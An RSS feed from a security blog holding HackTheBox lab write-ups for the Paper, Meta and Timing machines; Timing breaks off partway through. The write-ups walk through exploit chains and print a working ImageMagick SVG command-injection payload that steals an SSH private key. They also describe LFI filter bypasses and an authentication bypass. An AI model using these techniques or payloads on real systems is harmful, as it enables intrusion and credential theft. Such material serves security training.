<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-06-18T18:29:06+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Paper - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/paper.html" rel="alternate" type="text/html" title="Paper - HackTheBox" /><published>2022-06-18T00:00:00+01:00</published><updated>2022-06-18T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/paper</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/paper.html"><![CDATA[<p><strong>Paper</strong> is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of <em>RocketChat</em> with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220210063737.png" alt="" /></p>

<p><img src="/assets/img/20220210063801.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Feb  6 02:17:09 2022 as: nmap -sC -sC -oN nmap.txt -v 10.10.11.143
Nmap scan report for 10.10.11.143
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  https
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Feb  6 02:18:44 2022 -- 1 IP address (1 host up) scanned in 95.12 seconds

</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20220210064120.png" alt="" /></p>

<p>Checking my Burp Suite logs, one header stood out;</p>

<p><img src="/assets/img/20220210064528.png" alt="" /></p>

<p>A quick googling told me that;</p>

<blockquote>
  <p>x-backend-server header is used to return the name of the back end webserver that may sit behind load balancer server</p>
</blockquote>

<p>The server is listening on both port <strong>80</strong> and <strong>443</strong>, so I was expecting port <strong>80</strong> to be redirecting to <strong>443</strong>, but it isn’t. Sending a request over HTTPs (PORT <strong>443</strong>) loads the same page, but with the <strong>X-Backend-Server</strong> header removed. So I am assuming the service on port <strong>80</strong> is acting as a proxy;</p>

<p><img src="/assets/img/20220210065044.png" alt="" /></p>

<p>I added the <strong>office.paper</strong> hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, and got a different page;</p>

<p><img src="/assets/img/20220210065336.png" alt="" /></p>

<p>The bottom part of the page (comments and search field) hints at a wordpress site, and sure enough, it is one;</p>

<p><img src="/assets/img/20220210065526.png" alt="" /></p>

<p><br /></p>

<h4 id="officepaper">OFFICE.PAPER</h4>

<p>This is probably the only user, and likely the admin user because the user <strong>admin</strong> may not exist according to the password reset page, and a blog post;</p>

<p><img src="/assets/img/20220210070239.png" alt="" /></p>

<p><em>Wappalyzer</em> identified the wordpress version as <strong>5.2.3</strong>;</p>

<p><img src="/assets/img/20220210070626.png" alt="" /></p>

<p>There is an interesting comment from a user named <strong>nick</strong>;</p>

<p><img src="/assets/img/20220210070828.png" alt="" /></p>

<p>Testing the username in the <code class="language-plaintext highlighter-rouge">wp-login.php</code> page, it indicate the user exists.</p>

<p>I updated my <code class="language-plaintext highlighter-rouge">wpscan</code>, and load my API token to scan the website for known vulnerabilities. <strong>31</strong> vulns were identified, but one in particular caught my attention;</p>

<p><img src="/assets/img/20220210153240.png" alt="" /></p>

<p>Remember earlier <strong>nick</strong> was warning <strong>prisonmike</strong> (Michael) about saving sensitive data in drafts? The above vuln claims that private posts or drafts can be viewed by unauthenticated users. Going to the first link https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2, I found a simple PoC URL, which worked when requesting <code class="language-plaintext highlighter-rouge">http://office.paper/?static=1</code>;</p>

<p><img src="/assets/img/20220210153716.png" alt="" /></p>

<p>Note that the above revealed hidden domain on the site, so I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with it. The URL http://chat.office.paper/register/8qozr226AhkCHZdyY looks interesting as it looks like we can use it to create an account on the service. Going to the homepage, I got this page;</p>

<p><img src="/assets/img/20220210154214.png" alt="" /></p>

<p>Sure enough, going to the URL found using the draft leak, I was presented with a registration form;</p>

<p><img src="/assets/img/20220210154612.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="rocketchat">RocketChat</h3>
<p><br /></p>

<p>Following successful sign up, I was logged into the chat service. There is a channel named <em>general</em> which contains a few messages;</p>

<p><img src="/assets/img/20220210155734.png" alt="" /></p>

<p>Going through the chat log, I found out there is a bot in the channel with the name <strong>recyclops</strong>;</p>

<p><img src="/assets/img/20220210160107.png" alt="" /></p>

<p>The bot has a help page that showed an interesting feature that could be used to read files on the server;</p>

<p><img src="/assets/img/20220210160209.png" alt="" /></p>

<p>I don’t have permissions to send message in the <em>General</em> channel, but I can send a direct message to the bot by clicking on it’s profile and clicking the message icon. I used the <code class="language-plaintext highlighter-rouge">list sale</code> command to list files available as specified by the bot. The output look similar to that generated by the shell command <code class="language-plaintext highlighter-rouge">ls</code>;</p>

<p><img src="/assets/img/20220210161154.png" alt="" /></p>

<p>I tested for <em>path traversal</em>, and it turned out to be vulnerable. It looks like I have acces to the home directory of a user named <strong>dwight</strong>;</p>

<p><img src="/assets/img/20220210161312.png" alt="" /></p>

<p>There is no SSH key for the user in the <code class="language-plaintext highlighter-rouge">.ssh</code> directory. Attempts to inject shell commands into the <code class="language-plaintext highlighter-rouge">ls</code> command used to list directories kept getting detected;</p>

<p><img src="/assets/img/20220210162350.png" alt="" /></p>

<p>So I started hunting for the source code of the bot, and found it at <code class="language-plaintext highlighter-rouge">../hubot</code>. The file <code class="language-plaintext highlighter-rouge">hubot/scripts/files.js</code> is the one detecting our command injections;</p>

<p><img src="/assets/img/20220210162620.png" alt="" /></p>

<p>I spent some time working on a way to bypass the filter, but I couldn’t, so I moved on. Dumping the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file showed that local users <strong>rocketchat</strong> and <strong>dwight</strong> exist. Looking the the source directory of <code class="language-plaintext highlighter-rouge">hubot</code>, I found a credential inside <code class="language-plaintext highlighter-rouge">hubot/.env</code> file;</p>

<p><img src="/assets/img/20220210214843.png" alt="" /></p>

<p>Testing the password against the local users via SSH, I was able to login to the account of <strong>dwight</strong> and obtain the user flag;</p>

<p><img src="/assets/img/20220210214933.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>dwight</strong> does not have any sudo permissions in the box. For some reasons I could not run <code class="language-plaintext highlighter-rouge">pspy</code> in the host, as it just hangs without displaying any processes. <code class="language-plaintext highlighter-rouge">linPEAS</code> also didn’t work at first, until after I updated it, and even then it took very long to finish. Since this box was released after <strong>pwnkit</strong>, I looked at <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code>, and the date indicates it may be vulnerable. I had to rely on modification date of the binary because the patch released for <em>pwnkit</em> did not increment the version number;</p>

<p><img src="/assets/img/20220211173419.png" alt="" /></p>

<p>The <strong>pwnkit</strong> vuln seems to be mitigated by stripping the binary of <em>SUID</em> permissions, which pretty much breaks it. I started looking for exploit for this, and found a GitHub repo at https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation by a user named <strong>secnigma</strong>, which is interesting because that’s the author of the box.</p>

<p>The exploit did not work after multiple tries, so I started looking for another more reliable PoC. I found this: https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py</p>

<p>Running the python script in the box, I got root on the first attempt;</p>

<p><img src="/assets/img/20220211174234.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Found open ports: <strong>22</strong>, <strong>80</strong>, and <strong>443</strong></li>
  <li>Identified a hidden subdomain <strong>office.paper</strong> in <code class="language-plaintext highlighter-rouge">X-Backend-Server</code> header.</li>
  <li><strong>office.paper</strong>
    <ul>
      <li>This was found to be a <em>wordpress</em> site.</li>
      <li>Exploited a wordpress vulnerability that leaks private drafts/posts of users.</li>
      <li>Leaked draft revealed a subdomain <strong>chat.office.paper</strong>.</li>
    </ul>
  </li>
  <li><strong>chat.office.paper</strong>
    <ul>
      <li>Running an instance of <em>RocketChat</em>.</li>
      <li>Exploited a bot to read arbitrary files on the server.</li>
      <li>Read a config file that contains a password, which gave access to the box over SSH as the user <strong>dwight</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>dwight</strong>
    <ul>
      <li>Exploited a CVE to gain code execution as root.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="custom exploitation" /><category term="rocketchat" /><category term="pwnkit" /><summary type="html"><![CDATA[Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.]]></summary></entry><entry><title type="html">Meta - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/meta.html" rel="alternate" type="text/html" title="Meta - HackTheBox" /><published>2022-06-10T00:00:00+01:00</published><updated>2022-06-10T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/meta</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/meta.html"><![CDATA[<p><strong>Meta</strong> is a pretty easy <em>medium-rated</em> box on <em>HackTheBox</em>. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an <code class="language-plaintext highlighter-rouge">exiftool</code> CVE. User access is also another CVE targeting <em>ImageMagick</em>, and privesc to root is through a vulnerable sudo configuration on <code class="language-plaintext highlighter-rouge">neofetch</code>, which allows you to hijack the configuration file used by the program.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220210004831.png" alt="" /></p>

<p><img src="/assets/img/20220210004850.png" alt="" /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Jan 29 07:22:30 2022 as: nmap -sS -sV -oN nmap.txt -v meta.htb
Nmap scan report for meta.htb (10.10.11.140)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 29 07:24:32 2022 -- 1 IP address (1 host up) scanned in 122.32 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Redirects to <strong>artcorp.htb</strong>.</p>

<p><img src="/assets/img/20220210005037.png" alt="" /></p>

<p>Bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code> revealed a subdomain: <strong>dev01.artcorp.htb</strong>;</p>

<p><img src="/assets/img/20220210005302.png" alt="" /></p>

<p>The page links to <code class="language-plaintext highlighter-rouge">/metaview/</code>, which provides a form for image upload;</p>

<p><img src="/assets/img/20220210005407.png" alt="" /></p>

<p>After uploading an image, I got an output that resembles the one generated by <code class="language-plaintext highlighter-rouge">exiftool</code>;</p>

<p><img src="/assets/img/20220210005546.png" alt="" /></p>

<p>I started bruteforcing the for hidden directories in hope of finding where the files are uploaded, but was unsuccessful.</p>

<p>Searching for exploits targeting <code class="language-plaintext highlighter-rouge">exiftool</code>, <strong>CVE-2021-22204</strong> caught my attention, and I found a PoC at https://github.com/convisolabs/CVE-2021-22204-exiftool</p>

<p>I edited the <code class="language-plaintext highlighter-rouge">exploit.py</code> file with my host info, and then execute it to generate a malicious JPG file;</p>

<p><img src="/assets/img/20220210010059.png" alt="" /></p>

<p>I uploaded the file to the server, and gained code execution as <strong>www-data</strong>;</p>

<p><img src="/assets/img/20220210010238.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory showed that a local user named <strong>thomas</strong> exist. Nothing of importance could be obtained from the source files of the web app, and I couldn’t find anything of interest in the output of <code class="language-plaintext highlighter-rouge">linpeas</code>.</p>

<p>Running <code class="language-plaintext highlighter-rouge">pspy</code> on the host, I identified a cron task that runs as <strong>thomas</strong> and execute the script <code class="language-plaintext highlighter-rouge">/usr/local/bin/convert_images.sh</code>;</p>

<p><img src="/assets/img/20220210010937.png" alt="" /></p>

<p>The script is a simple bash script that uses <code class="language-plaintext highlighter-rouge">mogrify</code>, which is a tool of <em>ImageMagick</em> that is used to convert all files in a directory to <code class="language-plaintext highlighter-rouge">.png</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nb">cd</span> /var/www/dev01.artcorp.htb/convert_images/ <span class="o">&amp;&amp;</span> /usr/local/bin/mogrify <span class="nt">-format</span> png <span class="k">*</span>.<span class="k">*</span> 2&gt;/dev/null
pkill mogrify
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The user <code class="language-plaintext highlighter-rouge">www-data</code> that I am working as has write permissions in the directory from where images are converted;</p>

<p><img src="/assets/img/20220210011257.png" alt="" /></p>

<p>I identified the version of <em>ImageMagick</em> installed, and began hunting for exploits;</p>

<p><img src="/assets/img/20220210011431.png" alt="" /></p>

<p>After a couple of searches, I found a nice PoC at https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html that injects a shell command in the <code class="language-plaintext highlighter-rouge">authenticate</code> attribute of the <code class="language-plaintext highlighter-rouge">image</code> tag of an <code class="language-plaintext highlighter-rouge">.svg</code> file, which I edited to load the SSH private key of <strong>thomas</strong>;</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;image</span> <span class="na">authenticate=</span><span class="s">'ff" `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /dev/shm/pwned`;"'</span><span class="nt">&gt;</span>
  <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"pdf:/etc/passwd"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;get</span> <span class="na">width=</span><span class="s">"base-width"</span> <span class="na">height=</span><span class="s">"base-height"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;resize</span> <span class="na">geometry=</span><span class="s">"400x400"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"test.png"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"700"</span> <span class="na">height=</span><span class="s">"700"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">"msl:poc.svg"</span> <span class="na">height=</span><span class="s">"100"</span> <span class="na">width=</span><span class="s">"100"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/svg&gt;</span>
<span class="nt">&lt;/image&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I copied the file to <code class="language-plaintext highlighter-rouge">/var/www/dev01.artcorp.htb/convert_images</code>, and wait. After a few seconds, the file <code class="language-plaintext highlighter-rouge">/dev/shm/pwned</code> was created with the SSH key of <strong>thomas</strong>, which I copied to my box and used to gain access to the box as <strong>thomas</strong> over SSH;</p>

<p><img src="/assets/img/20220210012154.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>thomas</strong> has permission to run <code class="language-plaintext highlighter-rouge">/usr/bin/neofetch</code> as root using sudo without passing any arguments. This is a program used to view system info in a nice format. Notice also that the environment variable <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code> is not reset by sudo, which means we can expose it’s tampered value to sudo;</p>

<p><img src="/assets/img/20220211234832.png" alt="" /></p>

<p>The environment variable <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> defines the directory where user-specific configuration files are stored, normally <code class="language-plaintext highlighter-rouge">/home/&lt;username&gt;/.config</code>. Checking this directory, I found the configuration file of <code class="language-plaintext highlighter-rouge">neofetch</code> at <code class="language-plaintext highlighter-rouge">.config/neofetch/config.conf</code>, and it is basically a shell script that I can write to. So I overwrote it’s content with a bash reverse shell, set the <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> variable, and called <code class="language-plaintext highlighter-rouge">neofetch</code> with sudo;</p>

<p><img src="/assets/img/20220210013220.png" alt="" /></p>

<p>This gave me a root shell on the box;</p>

<p><img src="/assets/img/20220210013241.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Found port <strong>80</strong> and <strong>22</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Bruteforced a subdomain <strong>dev01.artcorp.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Found an image upload page used for viewing metadata using <code class="language-plaintext highlighter-rouge">exiftool</code>
    <ul>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution.</li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Identified a cron job that uses <code class="language-plaintext highlighter-rouge">mogrify</code> to convert files to <code class="language-plaintext highlighter-rouge">.png</code> in a writeable directory</li>
      <li>Exploited a shell command injection flaw using a <code class="language-plaintext highlighter-rouge">.svg</code> file to gain code execution as <strong>thomas</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>thomas</strong>
    <ul>
      <li>Exploited a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">neofetch</code> to gain code execution using malicious config file.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="exiftool" /><category term="imagemagick" /><category term="neofetch" /><category term="sudo" /><summary type="html"><![CDATA[Meta is a pretty easy medium-rated box on HackTheBox. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an exiftool CVE. User access is also another CVE targeting ImageMagick, and privesc to root is through a vulnerable sudo configuration on neofetch, which allows you to hijack the configuration file used by the program.]]></summary></entry><entry><title type="html">Timing - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/timing.html" rel="alternate" type="text/html" title="Timing - HackTheBox" /><published>2022-06-04T00:00:00+01:00</published><updated>2022-06-04T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/timing</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/timing.html"><![CDATA[<p><strong>Timing</strong> is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220209224109.png" alt="" /></p>

<p><img src="/assets/img/20220209224127.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Dec 14 10:59:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.135
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 14 11:00:44 2021 -- 1 IP address (1 host up) scanned in 48.55 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20220209224325.png" alt="" /></p>

<p>The login form is submitted via a simple POST request with two parameters;</p>

<p><img src="/assets/img/20220209224513.png" alt="" /></p>

<p>After playing around with it, I noticed a significant delay when sending a login request with the username <strong>admin</strong> than with any other username. This indicate the username <strong>admin</strong> may be valid, and the delay could be used to enumerate valid users.</p>

<p>Knowing that this is a PHP website, I started bruteforcing the web root for hidden files using <code class="language-plaintext highlighter-rouge">ffuf</code>, and found a few that look interesting;</p>

<p><img src="/assets/img/20220209224937.png" alt="" /></p>

<p>Most are login protected, except <code class="language-plaintext highlighter-rouge">/image.php</code>, which gave a <strong>200</strong> response with empty body. I started fuzzing it for parameters, and caught a break after a few requests because I got a non-empty response;</p>

<p><img src="/assets/img/20220209225332.png" alt="" /></p>

<p>Doing the request in burp, I got the following message;</p>

<p><img src="/assets/img/20220209225512.png" alt="" /></p>

<p>After a few tests, I understood the parameter is used to read local files, presumably images. The <code class="language-plaintext highlighter-rouge">file://</code> protocol is blocked by the web app, but the filter does not consider the fact that URL protocols in many cases are case-insensitive, meaning <code class="language-plaintext highlighter-rouge">file://</code> and <code class="language-plaintext highlighter-rouge">FILE://</code> are all valid. This allowed me to bypass the filter by changing the protocol to uppercase. The page is <strong>vulnerable</strong> to LFI.</p>

<p><img src="/assets/img/20220209230029.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<h4 id="source-code-analysis">Source Code Analysis</h4>
<p><br /></p>

<p>With the LFI vuln identified, I began to enumerate the source code of the web application in hope of finding something. Checking the default Apache2 configuration file at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/000-default.conf</code> showed that the web root is at <code class="language-plaintext highlighter-rouge">/var/www/html</code>. Attempting to view the source code of the <code class="language-plaintext highlighter-rouge">index.php</code> file using the LFI returned a <strong>302</strong> redirect to the login page;</p>

<p><img src="/assets/img/20220209230531.png" alt="" /></p>

<p>This indicate the server is executing the included file via the LFI as a PHP code, which means I can gain <em>arbitrary code execution</em> if I can write to file on the server. But I have no way to do so at the moment, so I continued to look for ways to read PHP code without executing it. The method that worked was using the <code class="language-plaintext highlighter-rouge">php://</code> protocol, which have a filter that can be used to read a file as a base64 encoded string;</p>

<p><img src="/assets/img/20220209231009.png" alt="" /></p>

<p>I used this approach to dump a couple of PHP files I have discovered either through bruteforce, or code analysis.</p>

<p>With interesting PHP files downloaded, I began to analyse them for something I could exploit. I discovered that the file that checks if a user is authenticated has a broken logic, which can be exploited to access restricted pages that do not perform explicit user validation. Take a look at the below code;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="c1">//ini_set('display_errors', '1');</span>
<span class="c1">//ini_set('display_startup_errors', '1');</span>
<span class="c1">//error_reporting(E_ALL);</span>

<span class="c1">// session is valid for 1 hour</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.gc_maxlifetime'</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
<span class="nb">session_set_cookie_params</span><span class="p">(</span><span class="mi">3600</span><span class="p">);</span>

<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">],</span> <span class="s2">"login.php"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ./login.php'</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">if</code> condition checks if there is <em>no</em> session variable named <code class="language-plaintext highlighter-rouge">userid</code>, and whether the requested URL <em>does not</em> contain the string <code class="language-plaintext highlighter-rouge">login.php</code>. If this two conditions are satisfied, user is redirected to the login page. This is a broken logic because if any of the conditions were not satisfied, the user will be asumed to be logged in.</p>

<p>Although we can’t control the first check that uses session variable, we can control the second one as the validation is performed on a URL we provided, and all we have to do is make sure it contains the string <code class="language-plaintext highlighter-rouge">login.php</code>. Since the whole URL is used for validation, I was able to bypass authentication by adding a <code class="language-plaintext highlighter-rouge">GET</code> parameter to the URL with the value <code class="language-plaintext highlighter-rouge">login.php</code>;</p>

<p><img src="/assets/img/20220209232637.png" alt="" /></p>

<p>This still did not give me access to any other key functionality in the web app, so I continue to study the source files. I eventually caught a break because the file <code class="language-plaintext highlighter-rouge">profile_update.php</code> is clearly vulnerable to <strong>SQL injection</strong> at line <code class="language-plaintext highlighter-rouge">47</code>, which I couldn’t exploit because the page attempts to validate the user account, which will fail before the vulnerable code is executed;</p>

<p><img src="/assets/img/20220209234147.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">admin_auth_check.php</code> looks like it’s being used to verify if a user is an admin using the session variable <code class="language-plaintext highlighter-rouge">role</code>, which for admins is set to <code class="language-plaintext highlighter-rouge">1</code>;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="k">include_once</span> <span class="s2">"auth_check.php"</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'role'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"No permission to access this panel!"</span><span class="p">;</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ./index.php'</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is very interesting because the <code class="language-plaintext highlighter-rouge">role</code> is saved in the backend database, which I can write to using the <em>SQL Injection</em> flaw discovered earlier. But not yet because I still have no access to a valid account.</p>

<p><br /></p>

<h4 id="hunting-for-valid-users">Hunting For Valid Users</h4>
<p><br /></p>

